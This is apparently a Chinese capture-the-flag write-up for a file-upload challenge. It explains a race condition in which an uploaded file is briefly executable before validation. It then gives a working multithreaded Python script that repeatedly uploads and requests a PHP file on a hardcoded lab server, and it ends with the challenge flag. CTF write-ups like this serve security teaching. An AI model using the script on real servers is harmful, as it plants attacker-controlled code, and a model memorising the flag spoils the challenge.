# wzsc_文件上传

## 条件竞争漏洞

> 条件竞争漏洞为特别漏洞,如果文件上传后有短暂的时间来验证文件是否合法.那么在这个短暂的时间内对传入的文件进行了临时保存,可能是一秒,也可能是0.几秒.如果解析的速度够快,在这短暂时间内php是可以解析的,从而上传了木马文件.

## 思路分析

> 打开就是个文件上传功能点,这道题考察的就是文件上传了.各种绕过都试过了,不行.最后只能是条件竞争漏洞了.

## payload

```
import os
import requests
import threading

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.url = 'http://61.147.171.105:51065/upload/info.php'
        self.upload_url = 'http://61.147.171.105:51065/upload.php'

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] create file info.php success.')
            os._exit(0)

    def _upload(self):
        print('upload file...')
        file = {
            'file': open('info.php', 'r')
        }
        requests.post(self.upload_url, files = file)

    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._upload()
                self._get()

if __name__ == '__main__':
    threads = 50    

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()
```

## flag

> cyberpeace{e7fbd79925c2b1677eb9ccc153f6293e}